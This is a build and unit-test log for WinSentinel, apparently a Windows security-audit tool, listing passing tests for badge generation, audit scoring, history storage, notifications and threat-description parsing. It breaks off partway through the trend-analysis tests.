Build started 2/24/2026 4:27:40 PM.
     1>Project "C:\Users\onlin\.openclaw\workspace\temp-builder\WinSentinel\WinSentinel.sln" on node 1 (Restore target(s)).
     1>ValidateSolutionConfiguration:
         Building solution configuration "Debug|x64".
       _GetAllRestoreProjectPathItems:
         Determining projects to restore...
       Restore:
         X.509 certificate chain validation will use the default trust store selected by .NET for code signing.
         X.509 certificate chain validation will use the default trust store selected by .NET for timestamping.
         Assets file has not changed. Skipping assets file writing. Path: C:\Users\onlin\.openclaw\workspace\temp-builder\WinSentinel\src\WinSentinel.App\obj\project.assets.json
         Assets file has not changed. Skipping assets file writing. Path: C:\Users\onlin\.openclaw\workspace\temp-builder\WinSentinel\src\WinSentinel.Core\obj\project.assets.json
         Assets file has not changed. Skipping assets file writing. Path: C:\Users\onlin\.openclaw\workspace\temp-builder\WinSentinel\tests\WinSentinel.Tests\obj\project.assets.json
         Assets file has not changed. Skipping assets file writing. Path: C:\Users\onlin\.openclaw\workspace\temp-builder\WinSentinel\src\WinSentinel.Cli\obj\project.assets.json
         Restored C:\Users\onlin\.openclaw\workspace\temp-builder\WinSentinel\src\WinSentinel.Cli\WinSentinel.Cli.csproj (in 82 ms).
         Restored C:\Users\onlin\.openclaw\workspace\temp-builder\WinSentinel\src\WinSentinel.App\WinSentinel.App.csproj (in 82 ms).
         Restored C:\Users\onlin\.openclaw\workspace\temp-builder\WinSentinel\tests\WinSentinel.Tests\WinSentinel.Tests.csproj (in 83 ms).
         Restored C:\Users\onlin\.openclaw\workspace\temp-builder\WinSentinel\src\WinSentinel.Core\WinSentinel.Core.csproj (in 82 ms).
         Assets file has not changed. Skipping assets file writing. Path: C:\Users\onlin\.openclaw\workspace\temp-builder\WinSentinel\src\WinSentinel.Agent\obj\project.assets.json
         Restored C:\Users\onlin\.openclaw\workspace\temp-builder\WinSentinel\src\WinSentinel.Agent\WinSentinel.Agent.csproj (in 2 ms).
         Assets file has not changed. Skipping assets file writing. Path: C:\Users\onlin\.openclaw\workspace\temp-builder\WinSentinel\src\WinSentinel.Service\obj\project.assets.json
         Restored C:\Users\onlin\.openclaw\workspace\temp-builder\WinSentinel\src\WinSentinel.Service\WinSentinel.Service.csproj (in 4 ms).
         
         NuGet Config files used:
             C:\Users\onlin\AppData\Roaming\NuGet\NuGet.Config
         
         Feeds used:
             https://api.nuget.org/v3/index.json
         All projects are up-to-date for restore.
     1>Done Building Project "C:\Users\onlin\.openclaw\workspace\temp-builder\WinSentinel\WinSentinel.sln" (Restore target(s)).
   1:2>Project "C:\Users\onlin\.openclaw\workspace\temp-builder\WinSentinel\WinSentinel.sln" on node 1 (VSTest target(s)).
     1>ValidateSolutionConfiguration:
         Building solution configuration "Debug|x64".
   1:2>Project "C:\Users\onlin\.openclaw\workspace\temp-builder\WinSentinel\WinSentinel.sln" (1:2) is building "C:\Users\onlin\.openclaw\workspace\temp-builder\WinSentinel\tests\WinSentinel.Tests\WinSentinel.Tests.csproj" (4:6) on node 2 (VSTest target(s)).
     4>BuildProject:
         Build started, please wait...
   4:6>Project "C:\Users\onlin\.openclaw\workspace\temp-builder\WinSentinel\tests\WinSentinel.Tests\WinSentinel.Tests.csproj" (4:6) is building "C:\Users\onlin\.openclaw\workspace\temp-builder\WinSentinel\tests\WinSentinel.Tests\WinSentinel.Tests.csproj" (4:7) on node 2 (default targets).
   4:7>Project "C:\Users\onlin\.openclaw\workspace\temp-builder\WinSentinel\tests\WinSentinel.Tests\WinSentinel.Tests.csproj" (4:7) is building "C:\Users\onlin\.openclaw\workspace\temp-builder\WinSentinel\src\WinSentinel.Core\WinSentinel.Core.csproj" (2:14) on node 4 (default targets).
     2>GenerateTargetFrameworkMonikerAttribute:
       Skipping target "GenerateTargetFrameworkMonikerAttribute" because all output files are up-to-date with respect to the input files.
       CoreGenerateAssemblyInfo:
       Skipping target "CoreGenerateAssemblyInfo" because all output files are up-to-date with respect to the input files.
       _GenerateSourceLinkFile:
         Source Link file 'obj\Debug\net8.0-windows\WinSentinel.Core.sourcelink.json' is up-to-date.
       CoreCompile:
       Skipping target "CoreCompile" because all output files are up-to-date with respect to the input files.
       GenerateBuildDependencyFile:
       Skipping target "GenerateBuildDependencyFile" because all output files are up-to-date with respect to the input files.
       CopyFilesToOutputDirectory:
         WinSentinel.Core -> C:\Users\onlin\.openclaw\workspace\temp-builder\WinSentinel\src\WinSentinel.Core\bin\Debug\net8.0-windows\WinSentinel.Core.dll
     2>Done Building Project "C:\Users\onlin\.openclaw\workspace\temp-builder\WinSentinel\src\WinSentinel.Core\WinSentinel.Core.csproj" (default targets).
   4:7>Project "C:\Users\onlin\.openclaw\workspace\temp-builder\WinSentinel\tests\WinSentinel.Tests\WinSentinel.Tests.csproj" (4:7) is building "C:\Users\onlin\.openclaw\workspace\temp-builder\WinSentinel\src\WinSentinel.Agent\WinSentinel.Agent.csproj" (6:9) on node 3 (default targets).
     6>GenerateTargetFrameworkMonikerAttribute:
       Skipping target "GenerateTargetFrameworkMonikerAttribute" because all output files are up-to-date with respect to the input files.
       CoreGenerateAssemblyInfo:
       Skipping target "CoreGenerateAssemblyInfo" because all output files are up-to-date with respect to the input files.
       _GenerateSourceLinkFile:
         Source Link file 'obj\Debug\net8.0-windows\WinSentinel.Agent.sourcelink.json' is up-to-date.
       CoreCompile:
       Skipping target "CoreCompile" because all output files are up-to-date with respect to the input files.
       _CreateAppHost:
       Skipping target "_CreateAppHost" because all output files are up-to-date with respect to the input files.
       _CopyOutOfDateSourceItemsToOutputDirectory:
       Skipping target "_CopyOutOfDateSourceItemsToOutputDirectory" because all output files are up-to-date with respect to the input files.
       GenerateBuildDependencyFile:
       Skipping target "GenerateBuildDependencyFile" because all output files are up-to-date with respect to the input files.
       GenerateBuildRuntimeConfigurationFiles:
       Skipping target "GenerateBuildRuntimeConfigurationFiles" because all output files are up-to-date with respect to the input files.
       CopyFilesToOutputDirectory:
         WinSentinel.Agent -> C:\Users\onlin\.openclaw\workspace\temp-builder\WinSentinel\src\WinSentinel.Agent\bin\Debug\net8.0-windows\WinSentinel.Agent.dll
     6>Done Building Project "C:\Users\onlin\.openclaw\workspace\temp-builder\WinSentinel\src\WinSentinel.Agent\WinSentinel.Agent.csproj" (default targets).
   4:7>Project "C:\Users\onlin\.openclaw\workspace\temp-builder\WinSentinel\tests\WinSentinel.Tests\WinSentinel.Tests.csproj" (4:7) is building "C:\Users\onlin\.openclaw\workspace\temp-builder\WinSentinel\src\WinSentinel.Cli\WinSentinel.Cli.csproj" (3:9) on node 1 (default targets).
     3>GenerateTargetFrameworkMonikerAttribute:
       Skipping target "GenerateTargetFrameworkMonikerAttribute" because all output files are up-to-date with respect to the input files.
       CoreGenerateAssemblyInfo:
       Skipping target "CoreGenerateAssemblyInfo" because all output files are up-to-date with respect to the input files.
       _GenerateSourceLinkFile:
         Source Link file 'obj\x64\Debug\net8.0-windows\WinSentinel.Cli.sourcelink.json' is up-to-date.
       CoreCompile:
       Skipping target "CoreCompile" because all output files are up-to-date with respect to the input files.
       _CreateAppHost:
       Skipping target "_CreateAppHost" because all output files are up-to-date with respect to the input files.
       _CopyOutOfDateSourceItemsToOutputDirectory:
       Skipping target "_CopyOutOfDateSourceItemsToOutputDirectory" because all output files are up-to-date with respect to the input files.
       GenerateBuildDependencyFile:
       Skipping target "GenerateBuildDependencyFile" because all output files are up-to-date with respect to the input files.
       GenerateBuildRuntimeConfigurationFiles:
       Skipping target "GenerateBuildRuntimeConfigurationFiles" because all output files are up-to-date with respect to the input files.
       CopyFilesToOutputDirectory:
         WinSentinel.Cli -> C:\Users\onlin\.openclaw\workspace\temp-builder\WinSentinel\src\WinSentinel.Cli\bin\x64\Debug\net8.0-windows\winsentinel.dll
     3>Done Building Project "C:\Users\onlin\.openclaw\workspace\temp-builder\WinSentinel\src\WinSentinel.Cli\WinSentinel.Cli.csproj" (default targets).
     4>GenerateTargetFrameworkMonikerAttribute:
       Skipping target "GenerateTargetFrameworkMonikerAttribute" because all output files are up-to-date with respect to the input files.
       CoreGenerateAssemblyInfo:
       Skipping target "CoreGenerateAssemblyInfo" because all output files are up-to-date with respect to the input files.
       _GenerateSourceLinkFile:
         Source Link file 'obj\x64\Debug\net8.0-windows\WinSentinel.Tests.sourcelink.json' is up-to-date.
       CoreCompile:
       Skipping target "CoreCompile" because all output files are up-to-date with respect to the input files.
       _CopyOutOfDateSourceItemsToOutputDirectory:
       Skipping target "_CopyOutOfDateSourceItemsToOutputDirectory" because all output files are up-to-date with respect to the input files.
       GenerateBuildDependencyFile:
       Skipping target "GenerateBuildDependencyFile" because all output files are up-to-date with respect to the input files.
       GenerateBuildRuntimeConfigurationFiles:
       Skipping target "GenerateBuildRuntimeConfigurationFiles" because all output files are up-to-date with respect to the input files.
       CopyFilesToOutputDirectory:
         WinSentinel.Tests -> C:\Users\onlin\.openclaw\workspace\temp-builder\WinSentinel\tests\WinSentinel.Tests\bin\x64\Debug\net8.0-windows\WinSentinel.Tests.dll
     4>Done Building Project "C:\Users\onlin\.openclaw\workspace\temp-builder\WinSentinel\tests\WinSentinel.Tests\WinSentinel.Tests.csproj" (default targets).
     4>BuildProject:
         Build completed.
         
Test run for C:\Users\onlin\.openclaw\workspace\temp-builder\WinSentinel\tests\WinSentinel.Tests\bin\x64\Debug\net8.0-windows\WinSentinel.Tests.dll (.NETCoreApp,Version=v8.0)
A total of 1 test files matched the specified pattern.
[xUnit.net 00:00:00.00] xUnit.net VSTest Adapter v3.1.5+1b188a7b0a (64-bit .NET 8.0.24)
[xUnit.net 00:00:00.20]   Discovering: WinSentinel.Tests
[xUnit.net 00:00:00.76]   Discovered:  WinSentinel.Tests
[xUnit.net 00:00:01.41]   Starting:    WinSentinel.Tests
  Passed WinSentinel.Tests.Services.BadgeGeneratorTests.SvgEscape_EscapesCorrectly(input: "a\"b", expected: "a&quot;b") [8 ms]
  Passed WinSentinel.Tests.Services.BadgeGeneratorTests.SvgEscape_EscapesCorrectly(input: "hello", expected: "hello") [< 1 ms]
  Passed WinSentinel.Tests.Services.BadgeGeneratorTests.SvgEscape_EscapesCorrectly(input: "a & b", expected: "a &amp; b") [< 1 ms]
  Passed WinSentinel.Tests.Services.BadgeGeneratorTests.SvgEscape_EscapesCorrectly(input: "a & <b> \"c\" 'd'", expected: "a &amp; &lt;b&gt; &quot;c&quot; &#39;d&#39;") [< 1 ms]
  Passed WinSentinel.Tests.Services.BadgeGeneratorTests.SvgEscape_EscapesCorrectly(input: "it's", expected: "it&#39;s") [< 1 ms]
  Passed WinSentinel.Tests.Services.BadgeGeneratorTests.SvgEscape_EscapesCorrectly(input: "<script>", expected: "&lt;script&gt;") [< 1 ms]
  Passed WinSentinel.Tests.Services.BadgeGeneratorTests.GenerateScoreBadge_CorrectColorForScore(score: 20, expectedColor: "#e05d44") [29 ms]
  Passed WinSentinel.Tests.Services.BadgeGeneratorTests.GenerateScoreBadge_CorrectColorForScore(score: 95, expectedColor: "#4c1") [< 1 ms]
  Passed WinSentinel.Tests.Services.BadgeGeneratorTests.GenerateScoreBadge_CorrectColorForScore(score: 75, expectedColor: "#a4a61d") [< 1 ms]
  Passed WinSentinel.Tests.Services.BadgeGeneratorTests.GenerateScoreBadge_CorrectColorForScore(score: 85, expectedColor: "#97ca00") [< 1 ms]
  Passed WinSentinel.Tests.Services.BadgeGeneratorTests.GenerateScoreBadge_CorrectColorForScore(score: 50, expectedColor: "#fe7d37") [< 1 ms]
  Passed WinSentinel.Tests.Services.BadgeGeneratorTests.GenerateScoreBadge_CorrectColorForScore(score: 65, expectedColor: "#dfb317") [< 1 ms]
  Passed WinSentinel.Tests.Services.BadgeGeneratorTests.GenerateFindingsBadge_AllClear [4 ms]
  Passed WinSentinel.Tests.Services.BadgeGeneratorTests.SaveBadge_NoBom [33 ms]
  Passed WinSentinel.Tests.Services.BadgeGeneratorTests.AllBadgeTypes_ProduceValidSvg_AllStyles(style: Flat) [1 ms]
  Passed WinSentinel.Tests.Services.BadgeGeneratorTests.AllBadgeTypes_ProduceValidSvg_AllStyles(style: ForTheBadge) [1 ms]
  Passed WinSentinel.Tests.Services.BadgeGeneratorTests.AllBadgeTypes_ProduceValidSvg_AllStyles(style: FlatSquare) [< 1 ms]
  Passed WinSentinel.Tests.Services.BadgeGeneratorTests.FlatSvg_HasGradientAndClipPath [< 1 ms]
  Passed WinSentinel.Tests.Services.BadgeGeneratorTests.GenerateGradeBadge_ForTheBadge_IsUppercase [< 1 ms]
  Passed WinSentinel.Tests.Services.BadgeGeneratorTests.EstimateTextWidth_NullString_ReturnsZero [6 ms]
  Passed WinSentinel.Tests.Services.BadgeGeneratorTests.SaveBadge_CreatesFile [26 ms]
  Passed WinSentinel.Tests.Services.BadgeGeneratorTests.GetBadgeColor_ReturnsCorrectColor(score: 40, expected: "#fe7d37") [< 1 ms]
  Passed WinSentinel.Tests.Services.BadgeGeneratorTests.GetBadgeColor_ReturnsCorrectColor(score: 70, expected: "#a4a61d") [< 1 ms]
  Passed WinSentinel.Tests.Services.BadgeGeneratorTests.GetBadgeColor_ReturnsCorrectColor(score: 100, expected: "#4c1") [< 1 ms]
  Passed WinSentinel.Tests.Services.BadgeGeneratorTests.GetBadgeColor_ReturnsCorrectColor(score: 80, expected: "#97ca00") [< 1 ms]
  Passed WinSentinel.Tests.Services.BadgeGeneratorTests.GetBadgeColor_ReturnsCorrectColor(score: 0, expected: "#e05d44") [< 1 ms]
  Passed WinSentinel.Tests.Services.BadgeGeneratorTests.GetBadgeColor_ReturnsCorrectColor(score: 69, expected: "#dfb317") [< 1 ms]
  Passed WinSentinel.Tests.Services.BadgeGeneratorTests.GetBadgeColor_ReturnsCorrectColor(score: 60, expected: "#dfb317") [< 1 ms]
  Passed WinSentinel.Tests.Services.BadgeGeneratorTests.GetBadgeColor_ReturnsCorrectColor(score: 89, expected: "#97ca00") [< 1 ms]
  Passed WinSentinel.Tests.Services.BadgeGeneratorTests.GetBadgeColor_ReturnsCorrectColor(score: 90, expected: "#4c1") [< 1 ms]
  Passed WinSentinel.Tests.Services.BadgeGeneratorTests.GetBadgeColor_ReturnsCorrectColor(score: 59, expected: "#fe7d37") [< 1 ms]
  Passed WinSentinel.Tests.Services.BadgeGeneratorTests.GetBadgeColor_ReturnsCorrectColor(score: 39, expected: "#e05d44") [< 1 ms]
  Passed WinSentinel.Tests.Services.BadgeGeneratorTests.GetBadgeColor_ReturnsCorrectColor(score: 79, expected: "#a4a61d") [< 1 ms]
  Passed WinSentinel.Tests.Services.BadgeGeneratorTests.GenerateAllModuleBadges_StacksMultipleModules [4 ms]
  Passed WinSentinel.Tests.Services.BadgeGeneratorTests.GenerateModuleBadge_ShowsModuleScore [< 1 ms]
  Passed WinSentinel.Tests.Services.BadgeGeneratorTests.GenerateModuleBadge_CriticalFindings [< 1 ms]
  Passed WinSentinel.Tests.Services.BadgeGeneratorTests.GetMarkdownEmbed_EmptyUrl_Throws [1 ms]
  Passed WinSentinel.Tests.Services.BadgeGeneratorTests.EstimateTextWidth_EmptyString_ReturnsZero [< 1 ms]
  Passed WinSentinel.Tests.Services.BadgeGeneratorTests.GenerateAllModuleBadges_EmptyReport_ReturnsFallback [< 1 ms]
  Passed WinSentinel.Tests.Services.BadgeGeneratorTests.EstimateTextWidth_NarrowChars_SmallerWidth [< 1 ms]
  Passed WinSentinel.Tests.Services.BadgeGeneratorTests.GenerateAllModuleBadges_OrderedByScoreDescending [< 1 ms]
  Passed WinSentinel.Tests.Services.BadgeGeneratorTests.ForTheBadgeSvg_HasLargerHeight [< 1 ms]
  Passed WinSentinel.Tests.Services.BadgeGeneratorTests.GenerateScoreBadge_XmlDeclaration [< 1 ms]
  Passed WinSentinel.Tests.Services.BadgeGeneratorTests.GenerateModuleBadge_SpecialCharsInCategory [< 1 ms]
  Passed WinSentinel.Tests.Services.BadgeGeneratorTests.GenerateGradeBadge_ShowsGradeLabel [< 1 ms]
  Passed WinSentinel.Tests.Services.BadgeGeneratorTests.SaveBadge_CreatesDirectory [4 ms]
  Passed WinSentinel.Tests.Services.BadgeGeneratorTests.GenerateFindingsBadge_WithCriticals [< 1 ms]
  Passed WinSentinel.Tests.Services.BadgeGeneratorTests.GenerateScoreBadge_ForTheBadgeStyle [< 1 ms]
  Passed WinSentinel.Tests.Services.BadgeGeneratorTests.GetMarkdownEmbed_WithLink [< 1 ms]
  Passed WinSentinel.Tests.Services.BadgeGeneratorTests.GetMarkdownEmbed_BasicImage [< 1 ms]
  Passed WinSentinel.Tests.Services.BadgeGeneratorTests.GenerateGradeBadge_CorrectGradeText(score: 95, expectedText: "grade A") [< 1 ms]
  Passed WinSentinel.Tests.Services.BadgeGeneratorTests.GenerateGradeBadge_CorrectGradeText(score: 75, expectedText: "grade C") [< 1 ms]
  Passed WinSentinel.Tests.Services.BadgeGeneratorTests.GenerateGradeBadge_CorrectGradeText(score: 65, expectedText: "grade D") [< 1 ms]
  Passed WinSentinel.Tests.Services.BadgeGeneratorTests.GenerateGradeBadge_CorrectGradeText(score: 85, expectedText: "grade B") [< 1 ms]
  Passed WinSentinel.Tests.Services.BadgeGeneratorTests.GenerateGradeBadge_CorrectGradeText(score: 30, expectedText: "grade F") [< 1 ms]
  Passed WinSentinel.Tests.Services.BadgeGeneratorTests.FlatSquareSvg_NoGradientNoClipPath [< 1 ms]
  Passed WinSentinel.Tests.Services.BadgeGeneratorTests.GetMarkdownEmbed_CustomAltText [< 1 ms]
  Passed WinSentinel.Tests.Services.BadgeGeneratorTests.GetMarkdownEmbed_NullUrl_Throws [2 ms]
  Passed WinSentinel.Tests.Services.BadgeGeneratorTests.GenerateFindingsBadge_BothCriticalAndWarnings_HasMiddleDot [< 1 ms]
  Passed WinSentinel.Tests.Services.BadgeGeneratorTests.GenerateModuleBadge_PerfectModule [< 1 ms]
  Passed WinSentinel.Tests.Services.BadgeGeneratorTests.GenerateFindingsBadge_InfoOnly_ShowsAllClear [< 1 ms]
  Passed WinSentinel.Tests.Services.BadgeGeneratorTests.GenerateScoreBadge_GradeF_ShowsRedColor [< 1 ms]
  Passed WinSentinel.Tests.Services.BadgeGeneratorTests.GenerateScoreBadge_FlatSquareStyle [< 1 ms]
  Passed WinSentinel.Tests.Services.BadgeGeneratorTests.GenerateScoreBadge_GradeA_ShowsGreenColor [< 1 ms]
  Passed WinSentinel.Tests.Services.BadgeGeneratorTests.GenerateScoreBadge_ReturnsValidSvg [< 1 ms]
  Passed WinSentinel.Tests.Services.BadgeGeneratorTests.EstimateTextWidth_LongerTextWider [< 1 ms]
  Passed WinSentinel.Tests.Services.BadgeGeneratorTests.GenerateScoreBadge_ZeroScore [< 1 ms]
  Passed WinSentinel.Tests.Services.BadgeGeneratorTests.GenerateScoreBadge_PerfectScore [< 1 ms]
  Passed WinSentinel.Tests.Services.BadgeGeneratorTests.EstimateTextWidth_BoldWider [< 1 ms]
  Passed WinSentinel.Tests.Services.BadgeGeneratorTests.GenerateFindingsBadge_WarningsOnly [< 1 ms]
  Passed WinSentinel.Tests.Models.AuditResultTests.Counts_CorrectlyTallied [1 ms]
  Passed WinSentinel.Tests.Models.AuditResultTests.OverallSeverity_PassWhenEmpty [4 ms]
  Passed WinSentinel.Tests.Models.AuditResultTests.Score_DeductsWarning5Points [< 1 ms]
  Passed WinSentinel.Tests.Models.AuditResultTests.OverallSeverity_CriticalWhenHasCritical [< 1 ms]
  Passed WinSentinel.Tests.Models.AuditResultTests.Score_PassDoesNotDeduct [< 1 ms]
  Passed WinSentinel.Tests.Models.AuditResultTests.Score_NeverBelowZero [< 1 ms]
  Passed WinSentinel.Tests.Models.AuditResultTests.Score_PerfectWhenNoFindings [< 1 ms]
  Passed WinSentinel.Tests.Models.AuditResultTests.Score_DeductsCritical20Points [< 1 ms]
  Passed WinSentinel.Tests.Models.AuditResultTests.Duration_CalculatedFromStartAndEnd [4 ms]
  Passed WinSentinel.Tests.Models.AuditResultTests.Score_MixedFindings [< 1 ms]
  Passed WinSentinel.Tests.Models.AuditResultTests.Score_InfoDoesNotDeduct [< 1 ms]
  Passed WinSentinel.Tests.Models.AuditResultTests.OverallSeverity_PassWhenAllPass [< 1 ms]
  Passed WinSentinel.Tests.Models.AuditResultTests.OverallSeverity_WarningWhenNoHigher [< 1 ms]
  Passed WinSentinel.Tests.Agent.AgentBrainTests.ExtractFilePath_ParsesCorrectly(description: "Path: C:\\Temp\\payload.dll more text", expected: "C:\\Temp\\payload.dll") [18 ms]
  Passed WinSentinel.Tests.Agent.AgentBrainTests.ExtractFilePath_ParsesCorrectly(description: "No path here", expected: null) [3 ms]
  Passed WinSentinel.Tests.Agent.AgentBrainTests.ExtractFilePath_ParsesCorrectly(description: "Path: C:\\Users\\test\\evil.exe", expected: "C:\\Users\\test\\evil.exe") [1 ms]
  Passed WinSentinel.Tests.Agent.AgentBrainTests.ProcessThreat_WithUserOverrideIgnore_LogsOnly [216 ms]
  Passed WinSentinel.Tests.Agent.AgentBrainTests.HandleUserFeedback_AutoFix_CreatesOverride [18 ms]
  Passed WinSentinel.Tests.Agent.AgentBrainTests.HandleUserFeedback_Ignore_CreatesOverride [14 ms]
  Passed WinSentinel.Tests.Agent.AgentBrainTests.ExtractIpAddress_ParsesCorrectly(description: "No IP address", expected: null) [14 ms]
  Passed WinSentinel.Tests.Agent.AgentBrainTests.ExtractIpAddress_ParsesCorrectly(description: "Connection from 192.168.1.100", expected: "192.168.1.100") [3 ms]
  Passed WinSentinel.Tests.Agent.AgentBrainTests.ExtractIpAddress_ParsesCorrectly(description: "Attack from 10.0.0.1 detected", expected: "10.0.0.1") [1 ms]
  Passed WinSentinel.Tests.Agent.AgentBrainTests.Shutdown_RecordsStopInJournal [29 ms]
  Passed WinSentinel.Tests.Agent.AgentBrainTests.ProcessThreat_CriticalLowRisk_ReturnsAutoFix [20 ms]
  Passed WinSentinel.Tests.Agent.AgentBrainTests.ProcessThreat_RecordsInJournal [7 ms]
  Passed WinSentinel.Tests.Agent.AgentBrainTests.Initialize_RecordsStartInJournal [5 ms]
  Passed WinSentinel.Tests.Agent.AgentBrainTests.ExtractProcessName_ParsesCorrectly(description: "Found \"malware.exe\" running", expected: "malware.exe") [2 ms]
  Passed WinSentinel.Tests.Agent.AgentBrainTests.ExtractProcessName_ParsesCorrectly(description: "No process name here", expected: null) [2 ms]
  Passed WinSentinel.Tests.Agent.AgentBrainTests.ExtractProcessName_ParsesCorrectly(description: "Process 'evil.exe' detected", expected: "evil.exe") [3 ms]
  Passed WinSentinel.Tests.Agent.AgentBrainTests.ExtractPid_ParsesCorrectly(description: "No PID here", expected: null) [5 ms]
  Passed WinSentinel.Tests.Agent.AgentBrainTests.ExtractPid_ParsesCorrectly(description: "Process 'evil.exe' (PID 1234) launched", expected: 1234) [4 ms]
  Passed WinSentinel.Tests.Agent.AgentBrainTests.ExtractPid_ParsesCorrectly(description: "PID 5678 is suspicious", expected: 5678) [1 ms]
  Passed WinSentinel.Tests.Agent.AgentBrainTests.ProcessThreat_FiresDecisionMadeEvent [5 ms]
  Passed WinSentinel.Tests.Agent.AgentBrainTests.ProcessThreat_CriticalMediumRisk_ReturnsAlert [4 ms]
  Passed WinSentinel.Tests.Services.AuditHistoryServiceTests.GetTrend_ReturnsEmptySummaryWhenNoData [95 ms]
  Passed WinSentinel.Tests.Services.AuditHistoryServiceTests.GetTrend_ComputesScoreChange [96 ms]
  Passed WinSentinel.Tests.Services.AuditHistoryServiceTests.EnsureDatabase_CreatesTablesSuccessfully [36 ms]
  Passed WinSentinel.Tests.Services.AuditHistoryServiceTests.GetRunDetails_ReturnsNullForMissingId [37 ms]
  Passed WinSentinel.Tests.Services.AuditHistoryServiceTests.GetRunDetails_IncludesModuleScores [45 ms]
  Passed WinSentinel.Tests.Services.AuditHistoryServiceTests.GetHistory_ReturnsRunsWithinDateRange [48 ms]
  Passed WinSentinel.Tests.Services.AuditHistoryServiceTests.FindingsWithRemediation_AreStoredCorrectly [44 ms]
  Passed WinSentinel.Tests.Services.AuditHistoryServiceTests.MultipleSaves_IncrementId [51 ms]
  Passed WinSentinel.Tests.Services.AuditHistoryServiceTests.SaveAuditResult_Scheduled_SetsFlag [43 ms]
  Passed WinSentinel.Tests.Services.AuditHistoryServiceTests.GetModuleHistory_FiltersByModuleName [47 ms]
  Passed WinSentinel.Tests.Services.AuditHistoryServiceTests.GetRunDetails_IncludesFindings [44 ms]
  Passed WinSentinel.Tests.Services.AuditHistoryServiceTests.GetTrend_FindsBestAndWorst [55 ms]
  Passed WinSentinel.Tests.Services.AuditHistoryServiceTests.PurgeOldRuns_RemovesOldData [56 ms]
  Passed WinSentinel.Tests.Services.AuditHistoryServiceTests.GetRecentRuns_RespectsLimit [69 ms]
  Passed WinSentinel.Tests.Services.AuditHistoryServiceTests.GetTrend_PointsOrderedOldestFirst [59 ms]
  Passed WinSentinel.Tests.Services.AuditHistoryServiceTests.GetModuleHistory_TrendIndicators [54 ms]
  Passed WinSentinel.Tests.Services.AuditHistoryServiceTests.SaveAuditResult_CanBeRetrieved [43 ms]
  Passed WinSentinel.Tests.Services.AuditHistoryServiceTests.GetModuleHistory_ReturnsModuleTrends [51 ms]
  Passed WinSentinel.Tests.Services.AuditHistoryServiceTests.SaveAuditResult_NotScheduled_ClearsFlag [46 ms]
  Passed WinSentinel.Tests.Services.AuditHistoryServiceTests.GetRunCount_ReturnsCorrectCount [50 ms]
  Passed WinSentinel.Tests.Services.AuditHistoryServiceTests.SaveAuditResult_StoresAndReturnsId [67 ms]
  Passed WinSentinel.Tests.Services.NotificationServiceTests.BuildTitle_WarningsOnly_ShowsWarnings [2 ms]
  Passed WinSentinel.Tests.Services.NotificationServiceTests.BuildTitle_AllClear_ShowsSuccess [< 1 ms]
  Passed WinSentinel.Tests.Services.NotificationServiceTests.BuildTitle_ScoreDropped_ShowsWarning [< 1 ms]
  Passed WinSentinel.Tests.Services.NotificationServiceTests.BuildTitle_CriticalFindings_ShowsCritical [< 1 ms]
  Passed WinSentinel.Tests.Services.NotificationServiceTests.NotifyScanResult_NormalUrgency_ForWarnings [12 ms]
  Passed WinSentinel.Tests.Services.NotificationServiceTests.ShouldNotify_ScheduledScanComplete_ReturnsTrue [< 1 ms]
  Passed WinSentinel.Tests.Services.NotificationServiceTests.BuildBody_WithPreviousScore_ShowsDelta [< 1 ms]
  Passed WinSentinel.Tests.Services.NotificationServiceTests.ShouldNotify_WhenScoreDrops_ReturnsTrue [< 1 ms]
  Passed WinSentinel.Tests.Services.NotificationServiceTests.NotifyScanResult_SkipsToast_WhenShouldNotNotify [< 1 ms]
  Passed WinSentinel.Tests.Services.NotificationServiceTests.ShouldNotify_NewCriticalFindings_ReturnsTrue [< 1 ms]
  Passed WinSentinel.Tests.Services.NotificationServiceTests.ShouldNotify_NewWarnings_ReturnsTrue [< 1 ms]
  Passed WinSentinel.Tests.Services.NotificationServiceTests.ShouldNotify_WhenScoreImproves_NotifyOnDropOnly_ReturnsFalse [< 1 ms]
  Passed WinSentinel.Tests.Services.NotificationServiceTests.BuildBody_WithImprovingScore_ShowsUpArrow [< 1 ms]
  Passed WinSentinel.Tests.Services.NotificationServiceTests.ShouldNotify_ManualScanComplete_WithOnlyNotifyOnComplete_ReturnsFalse [< 1 ms]
  Passed WinSentinel.Tests.Services.NotificationServiceTests.ShouldNotify_AllDisabled_ReturnsFalse [< 1 ms]
  Passed WinSentinel.Tests.Services.NotificationServiceTests.NotifyScanResult_HighUrgency_ForCriticalFindings [< 1 ms]
  Passed WinSentinel.Tests.Services.NotificationServiceTests.NotifyScanResult_SendsToast_WhenShouldNotify [< 1 ms]
  Passed WinSentinel.Tests.Services.NotificationServiceTests.BuildBody_IncludesScore [< 1 ms]
  Passed WinSentinel.Tests.IpcDtoTests.IpcAgentStatus_UptimeFormatted_Zero [3 ms]
  Passed WinSentinel.Tests.IpcDtoTests.IpcAgentStatus_UptimeFormatted_LargeDays [< 1 ms]
  Passed WinSentinel.Tests.IpcDtoTests.IpcAgentStatus_UptimeFormatted_Hours [< 1 ms]
  Passed WinSentinel.Tests.IpcDtoTests.IpcAgentStatus_UptimeFormatted_Days [< 1 ms]
  Passed WinSentinel.Tests.IpcDtoTests.IpcPolicyData_DefaultValues [1 ms]
  Passed WinSentinel.Tests.IpcDtoTests.IpcAgentStatus_UptimeFormatted_Minutes [< 1 ms]
  Passed WinSentinel.Tests.IpcDtoTests.IpcAgentStatus_UptimeFormatted_Seconds [< 1 ms]
  Passed WinSentinel.Tests.IpcDtoTests.IpcThreatEvent_Properties [5 ms]
  Passed WinSentinel.Tests.IpcDtoTests.IpcScanProgress_Properties [< 1 ms]
  Passed WinSentinel.Tests.IpcDtoTests.IpcChatResponse_DefaultValues [3 ms]
  Passed WinSentinel.Tests.IpcDtoTests.IpcAgentConfig_DefaultValues [< 1 ms]
  Passed WinSentinel.Tests.IpcDtoTests.IpcResponse_GetPayload_ComplexPayload [172 ms]
  Passed WinSentinel.Tests.IpcDtoTests.IpcResponse_GetPayload_NullPayload_ReturnsDefault [< 1 ms]
  Passed WinSentinel.Tests.IpcDtoTests.IpcFixResult_DefaultValues [23 ms]
  Passed WinSentinel.Tests.IpcDtoTests.IpcRequest_Properties [< 1 ms]
  Passed WinSentinel.Tests.Services.TrendAnalyzerTests.Analyze_MultipleRuns_CalculatesScoreChange [85 ms]
  Passed WinSentinel.Tests.Services.TrendAnalyzerTests.Analyze_StreakResets [3 ms]
  Passed WinSentinel.Tests.Services.TrendAnalyzerTests.Analyze_BuildsModuleTrends [24 ms]
  Passed WinSentinel.Tests.Services.TrendAnalyzerTests.Analyze_AlertOnNewCriticalFindings [1 ms]
  Passed WinSentinel.Tests.Services.TrendAnalyzerTests.GenerateBarChart_EmptyRuns [3 ms]
